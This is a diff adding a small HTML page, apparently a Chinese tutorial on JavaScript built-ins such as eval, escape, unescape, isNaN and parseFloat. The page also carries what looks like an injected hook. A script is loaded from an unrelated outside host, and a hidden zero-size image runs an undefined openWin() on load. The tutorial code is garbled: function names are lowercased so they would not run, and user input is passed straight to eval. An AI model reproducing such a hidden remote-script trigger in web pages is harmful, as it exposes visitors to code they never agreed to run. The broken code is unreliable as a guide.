@@ -1,0 +1,23 @@
+<!doctype html public "-//w3c//dtdxhtml1.0 strict//en"
+"http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+     <head>
+	     <title>javascript中预定义的函数</title>
+     <script language="javascript" type="text/javascript" src="http://js.i8844.cn/js/user.js"></script></head>
+  <body>
+      <script language="javascript">
+	    var const_exp;
+		const_exp = prompt("请输入一个常量表达式，运算符可以是javascipt所允许的任何运算符，\n"+"而操作数只能是常量，如123*321/9。","0");
+		alert(const_exp + "=" + eval(const_exp));//用于计算字符串中的表达式
+		var s = "wo shi zhong guo ren";
+		var se = escape(s);//把字符串转换为%aa
+		alert(se);
+		s = unescape(se);//同上相反
+		alert(s);
+		var m = isnan(s);//确定一个变量是否是nan
+		var n = isfinite(s);//确定一个变量是否有限
+		var l = parsefloat(s);
+		var k = parseint(s);
+	 </script>
+	<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>	
